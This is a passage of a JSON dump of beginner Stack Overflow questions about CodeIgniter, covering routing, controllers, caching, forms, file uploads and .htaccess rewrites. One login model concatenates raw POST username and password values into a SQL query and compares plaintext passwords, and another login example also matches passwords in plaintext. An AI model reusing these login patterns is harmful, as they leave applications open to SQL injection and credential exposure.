Thanks in advance!</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":39,"score":-5,"question_id":12820817,"title":"redirect error in codeigniter 1.7.2 when calling controllers from other controllers","body":"<p>Can i able to solve my redirection errors with the help of Htaccess file or not?</p>\n\n<p>Puzzled with the 301 redirect errors\nis there any way to solve them using our htaccess file</p>\n"},{"tags":["php","file","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12817388,"title":"how to write routes.php file in controllar using codeigniter?","body":"<p>I using codeigniter to trying add text in routes.php , What I want to do is add text in config/routes.php,  I had update the route.php file to 777 permission, but it was not working.</p>\n\n<p>here is my code</p>\n\n<pre><code>$file_path = \"var/www/html/staging/oscar/anthola/application/config/routes.php\";\n$file_exists = read_file($file_path);\n$slug =\"123\";\nif ( ! write_file($file_path, $slug))\n{\n     echo 'Unable to write the file';\n    echo write_file('./config/routes.php', $slug);\n}\nelse\n{\n     echo 'File written!';\n      echo write_file('./config/routes.php', $slug);\n}\n</code></pre>\n\n<p>Any idea how to solve my problem?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12816552,"title":"how to pass a variable from one controller to the other in Code igniter","body":"<p>I have just started learning Code Igniter  . </p>\n\n<p>I want to know how can I pass a variable from one controller(first_cont.php) to other controller (second_cont.php) ? </p>\n\n<p>Any help would be appreciated .</p>\n\n<p>Thanks in Advance :) </p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":66,"score":0,"question_id":12816417,"title":"How to pass an array element to another array to store in database in php","body":"<p>Hi i am facing one problem in passing the array elements to another array...</p>\n\n<pre><code>$order=$this-&gt;ro_model-&gt;get_ro_details($order_id);\n</code></pre>\n\n<p>By using above function i will get query results into array name called $order.</p>\n\n<p>Now i had form when it submits i will get some data from that form that i am saving in another name called $order_details.</p>\n\n<pre><code>$order_data=array(\n\n    'amount'=&gt;$this-&gt;input-&gt;post('amount'\n);  \n</code></pre>\n\n<p>Now i wanna save both the arrays data in one table in database. For that what i thought was i can pass first array data to second array data and i will save all the data in one array. Then later i will send that array to a function which will insert the data into database.</p>\n\n<pre><code>$this-&gt;ro_model-&gt;add_amount($order_data);\n</code></pre>\n\n<p>My problem how to pass that first array data to second array...........</p>\n\n<ul>\n<li>Note: All these are i am doing in codeigniter framework.</li>\n</ul>\n"},{"tags":["caching","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":307,"score":0,"question_id":6639361,"title":"Does Codeigniter 2.0 caching driver get loaded each time?","body":"<p>Codeigniters caching documentation recommends:</p>\n\n<p>$this->load->driver('cache', array('adapter' => 'apc', 'backup' => 'file'));</p>\n\n<p>As documented here:</p>\n\n<p><a href=\"http://codeigniter.com/user_guide/libraries/caching.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/libraries/caching.html</a></p>\n\n<p>If I load that drive on a single controller, does the driver get loaded each time I call any function in the controller or has the CI framework stored this in memory already?</p>\n\n<p>Thanks!!!</p>\n"},{"tags":["mysql","codeigniter","sql-order-by"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12816020,"title":"Codeigniter order_by with CONVERT","body":"<p>I have to order a selection by <code>CONVERT(`codExtern`, SIGNED)</code> with codeIgniter.\nIf I use it like this: </p>\n\n<pre><code>$this-&gt;db-&gt;order_by(\" CONVERT(`codExtern`, SIGNED) \");\n</code></pre>\n\n<p>the codeigniter puts the <code>SIGNED</code> word between <code>`</code>-s, like: </p>\n\n<pre><code>CONVERT(codExtern, `INTEGER` )\n</code></pre>\n\n<p>How can I make it work?</p>\n"},{"tags":["php","codeigniter","caching","pdo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12815428,"title":"cache_on method doesn't work","body":"<p>I would like to cache some sql queries on my website. I saw that CodeIgniter proposed a  <a href=\"http://codeigniter.com/user_guide/database/caching.html\" rel=\"nofollow\">Database Caching Class</a>. </p>\n\n<p>But when I call the caching method like <code>$this-&gt;db-&gt;cache_on();</code> my script return this error :</p>\n\n<p><strong>Fatal error: Call to undefined method PDO::cache_on()</strong></p>\n\n<p>I think that I have configured correctly my database.php config file :</p>\n\n<pre><code>$db['default']['cache_on'] = TRUE;\n$db['default']['cachedir'] = 'application/cache';\n</code></pre>\n\n<p>Maybe it's my PDO's version is too old? Which version do I need?</p>\n"},{"tags":["codeigniter","activerecord","login"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12815061,"title":"Codeigniter giving blank page after form submit","body":"<p>I'm working on a login system for codeigniter and after the login form is submitted, the page just comes up blank. I have the following code, with echo's inserted to help me find out where things go wrong.</p>\n\n<p>I have development mode set in the index.php mode and E_ALL in php.ini and receive errors on some other pages successfully.</p>\n\n<p>Controller for /account/login:</p>\n\n<pre><code>public function login()\n{\n    echo \"made it back into controller\";\n    $this-&gt;load-&gt;helper('form');\n    $this-&gt;load-&gt;library('form_validation');\n\n    $data['title'] = \"Log in\";\n\n    $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|xss_clean');\n\n    if ( $this-&gt;form_validation-&gt;run() === FALSE )\n    {\n        echo \"unable to validate\";\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('account/login', $data);\n        $this-&gt;load-&gt;view('templates/footer', $data );\n    } \n    else\n    {\n        echo \"attempting to login\";\n        if ( $this-&gt;account_model-&gt;login() == FALSE ) \n        {\n            echo \"failed\";\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('account/login', $data);\n            $this-&gt;load-&gt;view('templates/footer', $data );\n        }\n        else\n        {\n            echo \"success\";\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('account/successfullogin', $data);\n            $this-&gt;load-&gt;view('templates/footer', $data );\n        }\n    }\n\n}\n</code></pre>\n\n<p>login() method from Model, called by controller:</p>\n\n<pre><code>public function login ()\n{\n\n    require 'application/libraries/PasswordHash.php';\n\n    $t_hasher = new PasswordHash(8, FALSE);\n    $password = $this-&gt;input-&gt;post('password');\n    $hash = $t_hasher-&gt;HashPassword($password);\n    echo \"hashed\";\n\n    $query = $this-&gt;db-&gt;query('SELECT `login_token` FROM `Users` WHERE `username` = \"'.$this-&gt;input-&gt;post('username').'\" AND `password` = \"'. $this-&gt;input-&gt;post('password').'\"');\n\n    echo \"query made\";\n    $rowCount = $query-&gt;num_rows();\n    echo \"query counted\";\n\n    if ( $rowCount == 1 ) {\n        echo \"found row\";\n        $token = $query-&gt;result_array();\n        echo \"found token\";\n        $this-&gt;input-&gt;set_cookie( 'session_token', $token['login_token'], time()+259200, '/', 'notyetcreated.phpfogapp.com');\n        echo \"cookie created\";\n        return TRUE;\n    } else {\n        echo \"no beans\";\n        return FALSE;\n    }\n}\n</code></pre>\n\n<p>With the debug messages I've setup, after submitting the form, I get \"made it back into controller attempting to login\" and that's it. Any ideas as to what could be causing it?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":67,"score":0,"question_id":12814972,"title":"Codeigniter missing argument 1","body":"<p>I'm learning to make a simple login through codeigniter, then I got an error like \n<code>Missing argument 1 for C_login::login()</code> when I press the \"login\" button on my views without entering the username and password field.</p>\n\n<p>these are my controller, my IDE (netbeanPHP+CI framework) shows no error</p>\n\n<pre><code>&lt;?php\nclass C_login extends CI_Controller{\n\npublic function __construct() {\n    parent::__construct();\n    $this-&gt;load-&gt;model('m_login'); \n}\n\nfunction index()\n{\n    $this-&gt;form_validation-&gt;set_rules('username','trim|Username','required|exact_length[4]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('password','trim|Password','required|min_length[4]|max_length[40]|xss_clean|callback_login');\n\n    if($this-&gt;form_validation-&gt;run() == false)\n    {\n        $this-&gt;load-&gt;view('login');\n    }\n    else\n    {\n        echo 'sukses validasi';\n    }\n\n}\n\nfunction login($password)\n{\n    $username = $this-&gt;input-&gt;post('username');\n    $password = $this-&gt;input-&gt;post('password');\n    $jabatan = $this-&gt;input-&gt;post('jabatan');\n\n    $value = $this-&gt;m_login-&gt;cekpass($username,$password,$jabatan);\n\n    if($value)\n    {\n        return true;\n    }\n    else\n    {\n        return false;\n    }\n\n}\n\n\n}\n ?&gt;\n</code></pre>\n\n<p>and here is the model, i think my model is not showing any error</p>\n\n<pre><code>&lt;?php\nclass M_login extends CI_Model{\n\npublic function __construct() {\n    parent::__construct();\n}\n\nfunction login ($username, $password, $jabatan)\n{\n   $this-&gt;db-&gt;where('username',$username);\n   $this-&gt;db-&gt;where('password',$password);\n   $this-&gt;db-&gt;where('jabatan',$jabatan);\n\n   $value = $this-&gt;db-&gt;get('ms_user');\n\n   if($value-&gt;num_rows()&gt;0)\n   {\n       return true;\n   }\n   else\n   {\n       return false;\n   }\n\n\n}\n}?&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":257,"score":1,"question_id":8942477,"title":"image uploading with codeigniter","body":"<p>Am trying to upload an image and save the images full path in my images table but i dont know how to get the full path it out of the <code>$this-&gt;upload-&gt;data()</code> array this is my code below.</p>\n\n<pre><code>//assigns the user's sessioned id to the variable $user_id\n\n$user_id = $this-&gt;session-&gt;userdata('user_id');\n\n//sets rules for the image that is being uploaded\n$config['overwrite'] = FALSE; //does not overwrite any image adds +1 instead\n$config['encrypt_name'] = FALSE; //encrypts the images name\n$config['remove_spaces'] = TRUE; //removes spaces from the images name\n$config['file_name'] = $user_id.\"_0.jpg\";/*gives the image a new name combination of the user's id and a number*/\n$config['upload_path'] = './uploads'; // the uploaded images path\n$config['allowed_types'] = 'jpg|png';/*types of image extentions allowed to be uploaded*/\n$config['max_size'] = '2048';// maximum file size that can be uploaded (2MB)\n\nif ( ! is_dir($config['upload_path']) ) /* this checks to see if the file path is wrong or does not exist.*/\n    die(\"THE UPLOAD DIRECTORY DOES NOT EXIST\"); // error for invalid file path\n\n$this-&gt;load-&gt;library('upload',$config); /* this loads codeigniters file upload library*/\n//this checks for errors incase the image upload breaks a set rule.\nif (! $this-&gt;upload-&gt;do_upload() ) {\n    echo \"UPLOAD ERROR ! \".$this-&gt;upload-&gt;display_errors(); //image error\n}\nelse {\n    // success message to show that the image was successfuly uploaded.\n    echo \"THE IMAGE HAS BEEN UPLOADED : \"; var_dump($this-&gt;upload-&gt;data() );\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":51,"score":0,"question_id":12814714,"title":"check whether field is present in database with current field in controller","body":"<p>I am not able to write an if else in my controller and here is my controller code</p>\n\n<pre><code>$user=($this-&gt;session-&gt;userdata('uid')) ? $this-&gt;session-&gt;userdata('uid') : ''; \n\nif ($this-&gt;input-&gt;get('state')=='') { \n\n} else {\n    $user=$fb-&gt;getUser();\n} \nif ($user) {\n    $this-&gt;facebook_model-&gt;set_session_data($user); \n    redirect('name/home'); \n}else {\n    $data['login_url']= $fb-&gt;getLoginUrl(); \n} \n</code></pre>\n\n<p>$user is returning a Numeric value and I want to make a if else i.e if value of $user exists in my \"seekers\" table with field name \"seekers_uid\" then redirect to somewhere else.</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12814483,"title":"Codeigniter Model Parameter Passing","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12629365/codeigniter-and-the-model-view-controller-your-experience-your-meaning\">CodeIgniter and the Model-View-Controller – your experience / your meaning?</a>  </p>\n</blockquote>\n\n\n\n<p>I am guessing quite a simple question. With PHP and an MVC framework such as Codeigniter, is it better practice to always pass variables to the model? For example, should you pass post variables through the method call or directly reference <code>$this-&gt;input-&gt;post()</code> in the method itself? I am guessing it is best to pass them because you cannot assume the parameters will always come from the same source?</p>\n\n<p>Thanks,</p>\n\n<p>Tom</p>\n"},{"tags":["codeigniter","session","nagios"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12812719,"title":"Codeigniter session nagios","body":"<p>I'm using the session library that comes with CodeIgniter but I got a slight problem with it. I'm using a database to store all sessions but the session library also stores some strange rows with user_agent = 'check_http/v1.4.14 (nagios-plugins 1.4.14)'. My application is uploaded to a server with ssh. These kind of rows are added to the database almost every other second so the number of rows gets huge. I´ve read about Nagios but do anyone know how I can prevent these rows from being added to the database without changing in the session library?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":49,"score":-2,"question_id":12813794,"title":"check if value of field is present in database table","body":"<p>How to check whether value  of field is present in my database's field or not.\nI am writting logic in my controller where i am checking whether field that i am going to take is having value in it or not.</p>\n\n<p>if($user)=?</p>\n\n<p>in my database\ntable : seekers\nfield: seekers_uid</p>\n\n<p>$user is returning me with 10-12 digit numeric no. i want to check if it exists in seekers table or not.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":12811089,"title":"Post data not being sent by a code igniter form","body":"<p>I've got a slight problem with my CI2.0.2 application.</p>\n\n<p>From what I can tell, it is not getting any post data from a form and so is failing to run an update function, though most pages work fine.</p>\n\n<p>The form is as follows:</p>\n\n<pre><code>&lt;?php echo form_open('job/update/', array('id' =&gt; 'update', 'name' =&gt; 'update')); ?&gt;\n\n&lt;div class=\"images\"&gt;\n\n    &lt;?php echo img('application/images/updateJob.png');?&gt;\n\n&lt;/div&gt;\n\n&lt;h1&gt;Update Job&lt;/h1&gt;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n\n\n&lt;div class=\"fieldset\"&gt;\n\n    &lt;?php\n        if (isset($error))\n        {\n            echo '&lt;div id =\"error\"&gt;';\n            echo '&lt;h2&gt;Error:&lt;/h2&gt;';\n            echo '&lt;p&gt;'.$error.'&lt;/p&gt;';\n            echo '&lt;/div&gt;';\n        }\n    ?&gt;\n\n    &lt;input type=\"hidden\" name=\"c\" id='c' value=\"&lt;?php if(!empty($view[0])) { echo $view[0]; } else { echo \"0\"; }    ?&gt;\"&gt;\n    &lt;div class=\"left\"&gt;\n        &lt;h4&gt;Job Details:&lt;/h4&gt;\n        &lt;div&gt;\n            &lt;label for=\"job_number\"&gt;Job No:&lt;/label&gt;\n            &lt;input type=\"text\" name=\"job_number\" id=\"job_number\" value=\"&lt;?php echo $job['jobno']; ?&gt;\" disabled=\"disabled\"&gt;\n        &lt;/div&gt;\n\n        &lt;div&gt;\n            &lt;label for=\"date\"&gt;Date:&lt;/label&gt;\n            &lt;input type=\"text\" name=\"date\" id=\"date\" value=\"&lt;?php echo $job['datetime']-&gt;format('d-M-Y'); ?&gt;\"&gt;\n        &lt;/div&gt;\n\n        &lt;div&gt;\n            &lt;label for=\"council\"&gt;Council:&lt;/label&gt;\n            &lt;input type=\"text\" name=\"council\" id=\"council\" value=\"&lt;?php echo htmlspecialchars($job['council']); ?&gt;\"&gt; *\n        &lt;/div&gt;\n\n        &lt;div&gt;\n            &lt;label for=\"dano\"&gt;DA No:&lt;/label&gt;\n            &lt;input type=\"text\" name=\"dano\" id=\"dano\" value=\"&lt;?php echo htmlspecialchars($job['dano']); ?&gt;\"&gt;\n        &lt;/div&gt;\n\n        &lt;div&gt;\n            &lt;label for=\"client\"&gt;Client:&lt;/label&gt;\n            &lt;input type=\"text\" name=\"client\" id=\"client\" value=\"&lt;?php echo $job['clientid']; ?&gt;\" disabled=\"disabled\"&gt;           \n        &lt;/div&gt;\n\n    &lt;/div&gt;\n\n\n    &lt;div class=\"right\" style=\"margin-left: 390px;\"&gt;\n        &lt;h4&gt;Location:&lt;/h4&gt;\n        &lt;label for=\"street_no\"&gt;Street No:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"street_no\" id=\"street_no\" value=\"&lt;?php echo $address['streetno']; ?&gt;\"&gt; *\n        &lt;br&gt;\n\n        &lt;label for=\"street_name\"&gt;Street Name:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"street_name\" id=\"street_name\" value=\"&lt;?php echo $address['streetname']; ?&gt;\"&gt; *\n        &lt;br&gt;\n\n        &lt;label for=\"street_type\"&gt;Street Type:&lt;/label&gt;\n        &lt;select name=\"street_type\" id=\"street_type\"&gt;\n        &lt;?php\n            foreach ($street_types as $type)\n            {\n                echo '&lt;option';\n                if ($type == $address['streettype']) echo ' selected=\"selected\"';\n                echo '&gt;'.$type.'&lt;/option&gt;';\n            }\n        ?&gt;\n        &lt;/select&gt; *\n        &lt;br&gt;\n\n        &lt;label for=\"suburb\"&gt;Suburb:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"suburb\" id=\"suburb\" value=\"&lt;?php echo $address['suburb']; ?&gt;\"&gt; *\n        &lt;br&gt;\n\n        &lt;label for=\"postcode\"&gt;Postcode:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"postcode\" id=\"postcode\" value=\"&lt;?php echo $address['postcode']; ?&gt;\"&gt; *\n        &lt;br&gt;\n\n        &lt;label for=\"state\"&gt;State:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"state\" id=\"state\" value=\"&lt;?php echo $address['state']; ?&gt;\"&gt; *\n        &lt;br&gt;\n\n        &lt;label for=\"country\"&gt;Country:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"country\" id=\"country\" value=\"&lt;?php echo $address['country']; ?&gt;\"&gt;\n        &lt;br&gt;\n\n        &lt;label for=\"dp\"&gt;DP:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"dp\" id=\"dp\" value=\"&lt;?php echo $address['dp']; ?&gt;\"&gt;\n        &lt;br&gt;\n\n        &lt;label for=\"lot_no\"&gt;Lot No:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"lot_no\" id=\"lot_no\" value=\"&lt;?php echo $address['lotno']; ?&gt;\"&gt;\n        &lt;br&gt;\n\n        &lt;label for=\"po_box\"&gt;PO Box:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"po_box\" id=\"po_box\" value=\"&lt;?php echo $address['pobox']; ?&gt;\"&gt;\n\n    &lt;/div&gt;\n\n\n    &lt;div&gt;\n        &lt;input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Submit\" class=\"button\"&gt;\n        &lt;p&gt;* = Required fields&lt;/p&gt;\n    &lt;/div&gt;\n\n&lt;/div&gt;\n\n&lt;?php echo form_close();?&gt;\n</code></pre>\n\n<p>And the update section of the controller is as follows:</p>\n\n<pre><code>/**\n * Update an existing job.\n * @param   int $job_number     The number of the job to update.\n */\npublic function update($job_number=0)\n{\n    $this-&gt;load-&gt;model('Job_model');\n    $job     = array();\n    $address = array();\n\n    // Get post data.\n    $job['joblocation'] = '';\n    $job['jobno']       = $this-&gt;input-&gt;post('job_number');\n    $job['datetime']    = new DateTime($this-&gt;input-&gt;post('date'));\n    $job['dano']        = $this-&gt;input-&gt;post('dano');\n    $job['council']     = $this-&gt;input-&gt;post('council');\n    echo $job['jobno'];\n    echo $job['dano'];\n    echo $job['council'];\n    $address['streetno']    = $this-&gt;input-&gt;post('street_no');\n    $address['streetname']  = $this-&gt;input-&gt;post('street_name');\n    $address['suburb']      = $this-&gt;input-&gt;post('suburb');\n    $address['country']     = $this-&gt;input-&gt;post('country');\n    $address['postcode']    = $this-&gt;input-&gt;post('postcode');\n    $address['state']       = $this-&gt;input-&gt;post('state');\n    $address['dp']          = $this-&gt;input-&gt;post('dp');\n    $address['lotno']       = $this-&gt;input-&gt;post('lot_no');\n    $address['pobox']       = $this-&gt;input-&gt;post('po_box');\n    $address['streettype']  = $this-&gt;input-&gt;post('street_type');\n    echo \"here2\";\n    if (isset($_POST['submit']))\n    {\n        $this-&gt;Job_model-&gt;update($job);\n        echo \"here\";\n        redirect('job/');\n    }\n\n    // Otherwise, get the data from the database.       \n    else\n    {\n        $job = $this-&gt;Job_model-&gt;search($job_number);\n        $job = $job[0];\n        $job['datetime'] = new DateTime($job['datetime']);\n        $address = $this-&gt;Job_model-&gt;get_address($job['joblocation']);\n        $address = $address[0];\n    }\n\n\n    // Get the street types.\n    $street_types = array();\n    $this-&gt;load-&gt;model('staff_model');\n    $streets = $this-&gt;staff_model-&gt;get_street_types();\n\n    foreach ($streets as $street) \n    {\n        $street_types[$street['streettype']] = $street['streettype'];\n    }\n\n\n    // Load the client list.\n    $clients = array();\n    $this-&gt;load-&gt;model('client_model');\n    $people = $this-&gt;client_model-&gt;get_client_person_list();\n    $companies = $this-&gt;client_model-&gt;get_client_company_list();\n\n\n    // Allocate view data.\n    $viewdata = array();\n    $viewdata['job'] = $job;\n    $viewdata['street_types'] = $street_types;\n    $viewdata['address'] = $address;\n    $viewdata['people'] = $people;\n    $viewdata['companies'] = $companies;\n\n    $this-&gt;layout-&gt;view('job/update', $viewdata);\n}\n</code></pre>\n\n<p>Any ideas why this might be happening?</p>\n\n<p>Thanks in advance,</p>\n\n<p>James</p>\n"},{"tags":["php","linux",".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":52,"score":0,"question_id":12805241,"title":"What wrong with my .htaccess file so that it can work on linux?","body":"<p>I have a project in codeigniter and I have an .htaccess file I used to hide index.php page from users. On local machine it is when the project is in windows OS, but when I test in linux( ubuntu distribution) the .htaccess features do not work. Any suggestion for what I can do for linux is really appreciated.\nMy .htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\n    RewriteEngine On\n    RewriteBase /myproject/\n\n    ### Canonicalize codeigniter URLs\n\n    # If your default controller is something other than\n    # \"welcome\" you should probably change this\n    RewriteRule ^(platform(/index)?)/?$ / [L,R=301]\n    RewriteRule ^(.*)/index/?$ $1 [L,R=301]\n\n    # Removes trailing slashes (prevents SEO duplicate content issues)\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.+)/$ $1 [L,R=301]\n\n    # Enforce www\n    # If you have subdomains, you can add them to\n    # the list using the \"|\" (OR) regex operator\n   RewriteCond %{HTTP_HOST} !^(localhost|myproject) [NC]\n   RewriteRule ^(.*)$ http://localhost/myproject/$1 [L,R=301]\n\n\n\n    # Removes access to the system folder by users.\n    # Additionally this will allow you to create a System.php controller,\n    # previously this would not have been possible.\n    # 'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php/$1 [L]\n\n    # Checks to see if the user is attempting to access a valid file,\n    # such as an image or css document, if this isn't true it sends the\n    # request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php/$1 [L]\n\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n\n    # Without mod_rewrite, route 404's to the front controller\n    ErrorDocument 404 /index.php\n\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":280,"score":1,"question_id":4957058,"title":"CodeIgniter - Turn off controller function call?","body":"<p>I simply want to load the controller and not call a function based on the URI, so that I can then generate the page based on the following segments. <strong><em>How do I change the default behaviour to do this?</em></strong> eg.</p>\n\n<p>example.com/class/function/ID >>> example.com/class/ID/ID</p>\n\n<p>I thought all I needed to do was in config.php add:</p>\n\n<pre><code>$route['find/(:any)/(:any)'] = \"find/$1/$2\";\n</code></pre>\n\n<p>but this gives me a 404.</p>\n\n<hr>\n\n<p>example.com/find/item/location</p>\n\n<pre><code>class Find extends CI_Controller {\n\nprivate $s1;\nprivate $s2;\n\nfunction __construct()\n{\n    parent::__construct();\n}\n\nfunction index()\n{\n    $this-&gt;s1 = $this-&gt;uri-&gt;segment(2);\n    $this-&gt;s2 = $this-&gt;uri-&gt;segment(3);\n    $this-&gt;makePage();\n}\n\nfunction makePage()\n{\n    echo 'Page about ' . $this-&gt;s1 . 'in ' . $this-&gt;s2;\n    //Get Data ($s1 &amp; $s2)\n    //Load View \n}\n}\n</code></pre>\n"},{"tags":["php","oop","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1022,"score":0,"question_id":4892237,"title":"CodeIgniter 2.0 Cannot use method of a model from controller","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/54566/call-to-a-member-function-on-a-non-object\">Call to a member function on a non-object</a>  </p>\n</blockquote>\n\n\n\n<p>I'm trying to call a method of my model from my controller and I keep getting an error and I'm unsure as to what im doing wrong</p>\n\n<p>PHP Version: 5.3\nCodeIgniter Version: 2.0</p>\n\n<p>/application/models/blog.php</p>\n\n<pre><code>    class Blog extends CI_Model {\n\n    var $title   = '';\n    var $content = '';\n    var $date    = '';\n\n    function __construct()\n    {\n        // Call the Model constructor\n        parent::__construct();\n    }\n\n    function get_last_ten_entries()\n    {\n        return 10;\n    }\n\n}\n</code></pre>\n\n<p>/application/controllers/page.php</p>\n\n<pre><code>&lt;?php\nclass Page extends CI_Controller {  \n\n    function index() {\n        $this-&gt;load-&gt;model('Blog');\n        print $this-&gt;Blog-&gt;get_last_ten_entries();\n\n    }\n}\n</code></pre>\n\n<p>?></p>\n\n<p>Error Message:</p>\n\n<pre><code>Fatal error: Call to a member function get_last_ten_entries() on a non-object\n</code></pre>\n\n<p>Any help would be much appreciated.\nThanks</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":48,"score":0,"question_id":4917168,"title":"Trying to get values out of an array","body":"<p>My model:</p>\n\n<pre><code>class Biz_model extends Model{\n\n    function allInfo(){\n        $q = $this-&gt;db-&gt;get('negocios');\n\n        if($q-&gt;num_rows() &gt; 0){\n            foreach($q-&gt;result() as $row){\n                $data[] = $row;\n            }\n            return $data;\n        }\n    }\n} \n</code></pre>\n\n<p>my controller:</p>\n\n<pre><code>$this-&gt;load-&gt;model('biz_model');\n            $data['biz'] = $this-&gt;biz_model-&gt;allInfo();\n</code></pre>\n\n<p>and I'm trying to get the field values on my view by doing:</p>\n\n<pre><code>&lt;?php echo $biz-&gt;nombre; ?&gt;\n</code></pre>\n\n<p>but so far it isn't working like that or any variations of it.</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1417,"score":0,"question_id":4916653,"title":"CodeIgniter 2 - use default controller function without specifying in URL","body":"<p>Please see the following controller in CodeIgniter 2</p>\n\n<pre><code>&lt;?php\nclass user extends CI_Controller {\n\n    function __construct() {\n        parent::__construct();  \n    }   \n\n    function index($id) {\n        // do something here    \n    }\n}\n</code></pre>\n\n<p>?></p>\n\n<p>So my URL would be\n<a href=\"http://mydomain.com/user/index/2\" rel=\"nofollow\">http://mydomain.com/user/index/2</a></p>\n\n<p>But what I really want is to be able to not have the 'index' in the URL, so the URL would be \n<a href=\"http://mydomain.com/user/2\" rel=\"nofollow\">http://mydomain.com/user/2</a></p>\n\n<p>Does anybody know how I can achieve this?</p>\n\n<p>Thanks in advance </p>\n"},{"tags":["javascript","jquery","ajax","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":76,"score":2,"question_id":12808601,"title":"CodeIgniter Javascript form submission","body":"<p>I would first want to say that I am very new to javascript and jQuery.\nIts  a very silly and simple problem I suppose, and I am aware there are plenty of questions on this, and I did try all of them. Though I cant seem to solve my problem. </p>\n\n<p>I have an input field and a submit button. On clicking submit I would like to save the content of the input filed into the database, and continue to remain in the same page with content on page as is. </p>\n\n<p>My Javascript code is as follows:</p>\n\n<pre><code> &lt;script type=\"text/javascript\"&gt;\n        $(document).ready(function()\n        {\n            $('#submit').submit(function(e)\n            {\n\n                e.preventDefault();\n                var msg = $('#uname').val();\n                $.post(\"c_test/test_submit\", {uname: msg}, function(r) {\n                   console.log(r);\n                });\n            });\n        });\n    &lt;/script&gt;\n</code></pre>\n\n<p>And my html code as follows ( I use codeigniter):</p>\n\n<pre><code>$this-&gt;load-&gt;helper('form');\necho form_open();\n$data =array ('name'=&gt;'uname','id'=&gt;'uname');\necho form_input($data) . '&lt;br /&gt;';\n$data=array('name'=&gt;'submit','id'=&gt;'submit','value'=&gt;'Submit');\necho form_submit($data);\necho form_close();\n</code></pre>\n\n<p>I would be very grateful if anyone could point out my stupidity. Thanks!</p>\n"},{"tags":["mysql","codeigniter","oauth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12808775,"title":"CodeIgnither OAuth 2.0 database setup for users and access_tokens","body":"<p>Per <a href=\"http://stackoverflow.com/questions/12804728/codeigniter-web-application-sso-use-oauth2-saml-both-neither\">this question</a> I am using CodeIgniter and OAuth 2 in an attempt to provide SSO for internal users of my webapp, ideally verifying them against their Google Apps account. No registrations or anything, just existing users.</p>\n\n<p>Using the CI <a href=\"http://getsparks.org/packages/oauth2/versions/HEAD/show\" 